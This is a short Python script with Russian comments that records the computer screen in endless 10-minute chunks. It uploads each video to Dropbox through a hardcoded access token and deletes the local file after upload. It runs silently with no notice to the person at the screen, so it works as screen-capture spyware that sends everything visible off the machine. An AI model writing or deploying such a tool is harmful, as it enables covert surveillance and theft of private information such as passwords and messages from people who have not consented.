import cv2
import numpy as np
import pyautogui
import os
from datetime import datetime
import time
import dropbox

# --- Настройки ---
FPS = 10
DURATION = 10 * 60  # 10 минут
TARGET_WIDTH, TARGET_HEIGHT = 640, 360  # 360p

# --- Dropbox API ---
DROPBOX_TOKEN = "sgp7634loeubus3"
dbx = dropbox.Dropbox(DROPBOX_TOKEN)

# --- Шаг 1: тестовая отправка файла ---
test_file = "test_upload.txt"
with open(test_file, "w") as f:
    f.write(f"Тестовая отправка на Dropbox: {datetime.now()}")

with open(test_file, "rb") as f:
    dbx.files_upload(f.read(), f"/{test_file}", mode=dropbox.files.WriteMode.overwrite)

os.remove(test_file)
print("Тестовый файл отправлен, начинаем запись видео...")

# --- Шаг 2: бесконечный цикл записи видео каждые 10 минут ---
while True:
    video_file = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"

    # --- Создание видео ---
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_file, fourcc, FPS, (TARGET_WIDTH, TARGET_HEIGHT))

    start_time = time.time()
    while time.time() - start_time < DURATION:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.resize(frame, (TARGET_WIDTH, TARGET_HEIGHT))
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()

    # --- Загрузка видео на Dropbox ---
    with open(video_file, "rb") as f:
        dbx.files_upload(f.read(), f"/{video_file}", mode=dropbox.files.WriteMode.overwrite)

    # --- Удаление локального файла ---
    os.remove(video_file)

